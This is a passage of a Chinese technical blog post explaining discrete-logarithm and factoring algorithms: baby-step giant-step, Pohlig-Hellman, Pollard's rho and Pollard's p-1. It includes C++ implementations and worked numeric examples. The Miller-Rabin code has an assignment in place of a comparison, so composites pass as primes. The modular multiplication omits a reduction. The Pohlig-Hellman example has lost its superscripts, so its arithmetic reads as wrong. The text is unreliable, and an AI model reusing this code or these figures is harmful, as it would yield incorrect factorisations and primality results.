class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;ll,<span class="keyword">int</span>&gt;mp;</div><div class="line">ll p,a,b;</div><div class="line">ll n,m,now,ans,t;</div><div class="line"><span class="keyword">bool</span> flag;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">fast_pow</span><span class="params">(ll x)</span></span></div><div class="line">&#123;</div><div class="line">    ll sum = <span class="number">1</span>;</div><div class="line">    ll aa = a;</div><div class="line">    <span class="keyword">while</span> (x&gt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (x&amp;<span class="number">1</span>) </div><div class="line">            sum = (sum*aa)%p;</div><div class="line">        x = x&gt;&gt;<span class="number">1</span>;</div><div class="line">        aa = (aa*aa)%p;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%lld%lld%lld"</span>,&amp;p,&amp;a,&amp;b)!=EOF)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(a%p==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        mp.clear();</div><div class="line">        m = <span class="built_in">ceil</span>(<span class="built_in">sqrt</span>(p));</div><div class="line">        flag = <span class="literal">false</span> ;</div><div class="line">        now = b%p;        <span class="comment">//b*a^j 当j==0时 </span></div><div class="line">        mp[now] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</div><div class="line">        &#123;</div><div class="line">            now = (now*a)%p;</div><div class="line">            mp[now] = i;</div><div class="line">        &#125;</div><div class="line">        t = fast_pow(m);</div><div class="line">        now = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)    <span class="comment">//枚举 (a^m)^i</span></div><div class="line">        &#123;</div><div class="line">            now = (now*t)%p;</div><div class="line">            <span class="keyword">if</span>(mp[now])</div><div class="line">            &#123;</div><div class="line">                flag = <span class="literal">true</span>;</div><div class="line">                ans = i*m-mp[now];</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,(ans%p+p)%p);    <span class="comment">//printf("%lld\n",(ans%p+p)%p);</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(!flag) <span class="built_in">printf</span>(<span class="string">"no solution\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="0x2-Pohlig-Hellman算法"><a href="#0x2-Pohlig-Hellman算法" class="headerlink" title="0x2 Pohlig-Hellman算法"></a>0x2 Pohlig-Hellman算法</h3><p>此算法应用于密码学中比bsgs算法更广，而且效果也更佳！（因为bsgs算法所能求解的p值不能太大，位数多了就不能在有限时间内跑完）</p>
<p>原理： </p>
<p>问题： 已知a,b,p,以及p-1的分解质因数，求x使得 $a^x=b(mod\ p)$</p>
<p>设 $p-1=p_1^{e_1}*p_2^{e_2}...p_k^{e_k}$</p>
<p>若能有 $k$ 组可用的等式  $x=x_i\ (mod\ p_i^{e_i})$ ，就可以用中国剩余定理求解出 $x(mod\ p-1)$ </p>
<h4 id="2-1-求解-x-i"><a href="#2-1-求解-x-i" class="headerlink" title="2.1 求解$x_i$"></a>2.1 求解$x_i$</h4><p>对于 $p_i$ ，设   $x_i=c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}$ ，则  $x=x_i+s*p_i^{e_i}$</p>
<p><strong>求解 $c_0$ ：</strong></p>
<p>$b^{(p-1)/p_i}=(a^x)^{(p-1)/p_i}\ mod\ p$</p>
<p>$=(a^{c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}+s*p_i^{e_i}})^{(p-1)/p_i} \ mod\ p$</p>
<p>$=(a ^{c_0})^{(p-1)/p_i}\ mod\ p$</p>
<p>由于 $b^{(p-1)/p_i}$ 已知， 而 $c_0$ 取值范围只在$[0,p_i-1]$ ，因而在 $p_i$ 不是特别大的时候，完全是可解的。</p>
<p>有心的同学会发现，这个求解只需要在 $O(\lceil \sqrt{p_i} \rceil)$ 时间内就可求解，使用的仍是大步小步的思想。</p>
<p>设 $m=\lceil \sqrt{p_i}\ \rceil $ ，$c_0 = u*m - v$</p>
<p>则上式可表示为 $b^{(p-1)/p_i}*(a^{(p-1)/p_i})^v = (a^{m*(p-1)/p_i})^u$</p>
<p>利用hash表可以快速求解出来！</p>
<p><strong>求解 $c_i $ :</strong></p>
<p>基于上面的表达式，我们可以快速求解出$c_0$ 等值，然后求解$c_1$ ，依次求解，最终可以将所有解求出来。</p>
<p><strong>组合：</strong></p>
<p>$x_i=c_0+c_1*p_i+c_2*p_i^2+...+c_{e_i-1}*p_i^{e_i-1}$</p>
<h4 id="2-2-中国剩余定理求解x"><a href="#2-2-中国剩余定理求解x" class="headerlink" title="2.2 中国剩余定理求解x"></a>2.2 中国剩余定理求解x</h4><h4 id="2-3-范例"><a href="#2-3-范例" class="headerlink" title="2.3 范例"></a>2.3 范例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">Let the prime p = 8101, and a generator of Z8101 be a = 6. Find x so that</div><div class="line">ax = 7531 mod 8101.</div><div class="line"></div><div class="line">Observe that p-1 = 8100 = (22)(34)(52), is a product of small primes. We shall determine the numbers x2 = x mod (22), x3 = x mod (34) and x5 = x mod (52).</div><div class="line"></div><div class="line">Determination of x2.</div><div class="line">Since x2 is a number mod 4, we have x2 = c0 + c1 (2), with the coefficients being either 0 or 1. We determine these coefficients as follows.</div><div class="line">7531(p-1)/2 = 75314050 = -1 and as this = ac0 (p-1)/2, we have c0 = 1.</div><div class="line">Now, divide 7531 by ac0 to get</div><div class="line">7531(a-1) = 7531(6751) = 8006 mod p.</div><div class="line">8006(p-1)/4 = 80062025 = 1 and as this = ac1 (p-1)/2, we have c1 = 0.</div><div class="line"></div><div class="line">x2 = c0 + c1 (2) = 1 + 0(2) = 1.</div><div class="line"></div><div class="line">Determination of x3.</div><div class="line">Since x3 is a number mod 81, we have x3 = c0 + c1 (3) + c2 (9) + c3 (27), with the coefficients being either 0, 1 or 2. It will be of use to know the numbers a(p-1)/3 = 5883, and a2(p-1)/3 = 2217.</div><div class="line">7531(p-1)/3 = 2217, so c0 = 2.</div><div class="line">Now divide 7531 by ac0 to get</div><div class="line">7531(a-2) = 6735 mod p.</div><div class="line">6735(p-1)/9 = 1, so c1 = 0.</div><div class="line">Now divide 6735 by a3c1 to get</div><div class="line">6735(a0) = 6735 mod p.</div><div class="line">6735(p-1)/27 = 2217, so c2 = 2.</div><div class="line">Now divide 6735 by a9c2 to get</div><div class="line">6735(a-18) = 6992 mod p.</div><div class="line">6992(p-1)/81 = 5883, so c3 = 1.</div><div class="line"></div><div class="line">x3 = 2 + 0(3) + 2(9) + 1(27) = 47.</div><div class="line"></div><div class="line">Determination of x5.</div><div class="line">Since x5 is a number mod 25, x5 = c0 + c1 (5), with the coefficients being either 0, 1, 2, 3 or 4. We need to compute a(p-1)/5 = 3547, a2(p-1)/5 = 356, a3(p-1)/5 = 7077, a4(p-1)/5 = 5221.</div><div class="line">7531(p-1)/5 = 5221, so c0 = 4.</div><div class="line">Divide 7531 by ac0 to get</div><div class="line">7531(a-4) = 7613 mod p.</div><div class="line">7613(p-1)/25 = 356, so c1 = 2.</div><div class="line"></div><div class="line">x5 = 4 + 2(5) = 14.</div><div class="line"></div><div class="line">Determination of x.</div><div class="line">We now use the Chinese Remainder Theorem to compute the common solution of the congruences,</div><div class="line">x = 1 mod 4</div><div class="line">x = 47 mod 81</div><div class="line">x = 14 mod 25.</div><div class="line">M1 = 8100/(4) = 2025 </div><div class="line">y1 = M1-1 mod 4, y1 = 1.</div><div class="line">M2 = 8100/81 = 100</div><div class="line">y2 = M2-1 mod 81, y2 = 64.</div><div class="line"></div><div class="line">M3 = 8100/25 = 324</div><div class="line">y3 = M3-1 mod 25, y3 = 24.</div><div class="line"></div><div class="line">x = 1(2025)(1) + 47(100)(64) + 14(324)(24) = 6689 mod 8100.</div></pre></td></tr></table></figure>
<p>上文转载于 <a href="http://www-math.ucdenver.edu/~wcherowi/courses/m5410/phexam.html" target="_blank" rel="external">Pohlig-Hellman范例</a></p>
<h3 id="0x3-Pollard’s-rho算法"><a href="#0x3-Pollard’s-rho算法" class="headerlink" title="0x3 Pollard’s rho算法"></a>0x3 Pollard’s rho算法</h3><p>Pollard’s rho算法是一种常用的因数分解算法，对于分解因子较小的组合数特别有用。对于一个正整数n，在一般情况下，我们主要使用的是枚举1到n^(1/2)来求n的因子，所以算法复杂度是O(n^(1/2))。但是实际上有更好的办法，那就是Pollard&#39;s Rho算法，这个算法是一个随机化的算法，简单的说不是完全靠谱，一般我们认为它的平均算法复杂度是O(n^(1/4))。</p>
<h4 id="3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率"><a href="#3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率" class="headerlink" title="3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率"></a>3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率</h4><p>我们随即地从[1,N]中选择一个数，这个数是 p 或者 q 的可能性是非常小的，所有我们不得不重复运行算法来提高概率。那么，我们现在可以提出一个不同的问题：<br>不再只选取一个整数，我们能够选取 𝑘 个数，并问是否存在𝑥𝑖 − 𝑥𝑗能够整除N</p>
<p>当 $k=\sqrt{N}$ 时，可能性跳高到了50%</p>
<p>策略：</p>
<blockquote>
<p>在区间[𝟐, 𝑵 − 𝟏]中随即选取 𝒌 个数，𝒙𝟏, … … , 𝒙𝒌<br>判断是否存在𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 , 𝑵) &gt; 𝟏, 若存在，𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 ,𝑵) 是𝑵的一个因子 ( 𝒑 或 𝒒 )</p>
</blockquote>
<p>但是很早就出现了一个问题，我们需要选取大约 𝑁^1/4 个数，<br>这个数量太大了，以至于我们并不能将其存放在内存中</p>
<h4 id="3-2-Pollard‘s-rho算法详解"><a href="#3-2-Pollard‘s-rho算法详解" class="headerlink" title="3.2 Pollard‘s rho算法详解"></a>3.2 Pollard‘s rho算法详解</h4><p>为了解决数太多无法存储的问题，Pollard′s rho algorithm 只将两个数存放在内存中。</p>
<p>我们并不随机生成 k 个数并两两进行比较，而是一个一个地生成并检查连续的两个数。反复执行这个步骤并希望能够得到我们想要的数。我们使用一个函数来生成伪随机数。换句话说，我们不断地使用函数 𝑓 来生成（看上去或者说感觉上像的）随机数。并不是所有的函都能够这样做，但是有一个神奇的函数可以。它就是</p>
<p>$𝑓(𝑥) = ( 𝑥^2 + 𝑎 ) mod 𝑁$</p>
<p>你可以发现对于大部分的数据这个算法能够正常运行，但是对于某些数据，它将会进入无限循环。为什么呢？这是因为存在 𝑓 环的原因。当它发生的时候，我们会在一个有限数集中进行无限循环。</p>
<p>例如，我们可以构造一个伪随机函数并生成如下伪随机数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2, 10, 16, 23, 29, 13, 16, 23, 29, 13 … …</div></pre></td></tr></table></figure>
<p>在这个例子中，我们最终将会在16, 23, 29, 13这个圈中无限循环，永远找不到因子。</p>
<p>那么，<strong>如何探测环的出现呢？</strong></p>
<p>一种方法是记录当前产生过的所有的数𝑥1, 𝑥2, … … 𝑥𝑛,并检测是否存在𝑥𝑙 = 𝑥𝑛(𝑙 &lt; 𝑛)。在实际过程中，当 𝑛 增长到一定大小时，可能会造成的内存不够用的情况。</p>
<p>另一种方法是由Floyd发明的一个算法，我们举例来说明这个聪明而又有趣的算法。假设我们在一个很长很长的圆形轨道上行走，我们如何知道我们已经走完了一圈呢？当然，我们可以像第一种方法那样做，但是更聪明的方法是让 A 和 B 按照 B 的速度是A 的速度的两倍从同一起点开始往前走，当 B 第一次敢上 A 时(也就是我们常说的套圈)，我们便知道，B 已经走了至少一圈了。</p>
<h4 id="3-3-算法实现"><a href="#3-3-算法实现" class="headerlink" title="3.3 算法实现"></a>3.3 算法实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  </span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> times = <span class="number">50</span>;</div><div class="line"><span class="keyword">int</span> number = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;m;</div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Random</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> ((<span class="keyword">double</span>)rand( ) / RAND_MAX*n + <span class="number">0.5</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_mul</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod )</span> <span class="comment">//快速乘法取模</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans += a;</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = (a + a) % mod;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_pow</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod )</span> <span class="comment">//快速乘法下的快速幂，叼</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans = q_mul( ans, a, mod );</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = q_mul( a, a, mod );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">witness</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> n )</span><span class="comment">//miller_rabin算法的精华</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tem = n - <span class="number">1</span>;</div><div class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(tem % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		tem /= <span class="number">2</span>;</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x = q_pow( a, tem, n ); <span class="comment">//得到a^(n-1) mod n</span></div><div class="line">	<span class="keyword">if</span>(x == <span class="number">1</span> || x == n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">while</span>(j--)</div><div class="line">	&#123;</div><div class="line">		x = q_mul( x, x, n );</div><div class="line">		<span class="keyword">if</span>(x = n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">miller_rabin</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span>  <span class="comment">//检验n是否是素数</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(n == <span class="number">2</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">if</span>(n &lt; <span class="number">2</span> || n % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= times; i++)  <span class="comment">//做times次随机检验</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">long</span> <span class="keyword">long</span> a = Random( n - <span class="number">2</span> ) + <span class="number">1</span>; <span class="comment">//得到随机检验算子 a</span></div><div class="line">		<span class="keyword">if</span>(!witness( a, n ))  <span class="comment">//用a检验n是否是素数</span></div><div class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(b == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">	<span class="keyword">return</span> gcd( b, a%b );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">pollard_rho</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span><span class="comment">//找到n的一个因子</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x, y, d, i = <span class="number">1</span>, k = <span class="number">2</span>;</div><div class="line">	x = Random( n - <span class="number">1</span> ) + <span class="number">1</span>;</div><div class="line">	y = x;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		i++;</div><div class="line">		x = (q_mul( x, x, n ) + c) % n;</div><div class="line">		d = gcd( y - x, n );</div><div class="line">		<span class="keyword">if</span>(<span class="number">1</span>&lt;d&amp;&amp;d&lt;n)</div><div class="line">			<span class="keyword">return</span> d;</div><div class="line">		<span class="keyword">if</span>(y == x)<span class="comment">//找到循环，选取失败，重新来</span></div><div class="line">			<span class="keyword">return</span> n;</div><div class="line">		<span class="keyword">if</span>(i == k) <span class="comment">//似乎是一个优化，但是不是很清楚</span></div><div class="line">		&#123;</div><div class="line">			y = x;</div><div class="line">			k &lt;&lt;= <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	<span class="keyword">if</span>(miller_rabin( n ))</div><div class="line">	&#123;</div><div class="line">		m[n]++;</div><div class="line">		number++;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> p = n;</div><div class="line">	<span class="keyword">while</span>(p &gt;= n)</div><div class="line">		p = pollard_rho( p, c-- );</div><div class="line">	find( p, c );</div><div class="line">	find( n / p, c );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tar;</div><div class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; tar)</div><div class="line">	&#123;</div><div class="line">		number = <span class="number">0</span>;</div><div class="line">		m.clear();</div><div class="line">		find( tar, <span class="number">2137342</span> );</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"%lld = "</span>, tar );</div><div class="line">		<span class="keyword">if</span>(m.empty())</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld\n"</span>, tar );</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">for</span>(<span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;::iterator c = m.begin(); c != m.end();)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld^%d"</span>, c-&gt;first, c-&gt;second );</div><div class="line">			<span class="keyword">if</span>((++c) != m.end())</div><div class="line">				<span class="built_in">printf</span>( <span class="string">" * "</span> );</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"\n"</span> );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="0x4-Pollard-39-s-p-1-算法"><a href="#0x4-Pollard-39-s-p-1-算法" class="headerlink" title="0x4 Pollard&#39;s p-1 算法"></a>0x4 Pollard&#39;s p-1 算法</h3><h4 id="4-1-smooth与powersmooth"><a href="#4-1-smooth与powersmooth" class="headerlink" title="4.1 smooth与powersmooth"></a>4.1 smooth与powersmooth</h4><p>如果一个整数的所有素因子都不大于B，我们称这个整数是B-Smooth数</p>
<p>如果一个整数的所有素因子的对应指数次幂不大于B，我们称这个整数是B-powersmooth数</p>
<p>$720({2^4}{3^2}{5^1})$ 是一个5-smooth数，6-smooth数，7-smooth数</p>
<p>但5^1\&lt;3^2\&lt;2^4=16，所以它也是一个16-powersmooth数</p>
<h4 id="4-2-原理解释"><a href="#4-2-原理解释" class="headerlink" title="4.2 原理解释"></a>4.2 原理解释</h4><p>n 是一个合数，其中一个质数位p，由费马小定理有：$a^{K(p-1)}=1(mod\ p)$</p>
<p>如果 $x=1(mod\ p)$ ，就有 $p|gcd(x-1,n)$</p>
<p>这个算法的思想就是构造p-1，其有多个素因子，并且每个素因子的powersmooth不超过B，开始时随机选取一个x， 计算 $x^w\ mod\ n$ , $w=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ ， 如果有$gcd(x^w, n)$ 不等于1， 那么我们就相当于找到一个素数p了</p>
<h4 id="4-3-算法"><a href="#4-3-算法" class="headerlink" title="4.3 算法"></a>4.3 算法</h4><p><strong>Inputs</strong>: n: a composite number<br><strong>Output</strong>: a nontrivial factor of n or failure</p>
<ol>
<li>select a smoothness bound B</li>
<li>define $M=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ (note: explicitly evaluating M may not be necessary)</li>
<li>randomly pick a coprime to n (note: we can actually fix a, e.g. if n is odd, then we can always select a = 2, random selection here is not imperative)</li>
<li>compute $g = gcd(a^M − 1, n)$ (note: exponentiation can be done modulo n)</li>
<li>if 1 &lt; g &lt; n then return g</li>
<li>if g = 1 then select a larger B and go to step 2 or return failure</li>
<li>if g = n then select a smaller B and go to step 2 or return failure</li>
</ol>
<p>这里的larger B和smaller B有选择性的方法，具体是啥我也不太清楚！ </p>
<h4 id="4-4-范例"><a href="#4-4-范例" class="headerlink" title="4.4 范例"></a>4.4 范例</h4><p>If we want to factor the number n = 299.</p>
<ol>
<li>We select B = 5.</li>
<li>Thus $M = 2^2 × 3^1 × 5^1$.</li>
<li>We select a = 2.</li>
<li>$g = gcd(a^M − 1, n) = 13$.</li>
<li>Since 1 &lt; 13 &lt; 299, thus return 13.</li>
<li>299 / 13 = 23 is prime, thus it is fully factored: 299 = 13 × 23.</li>
</ol>
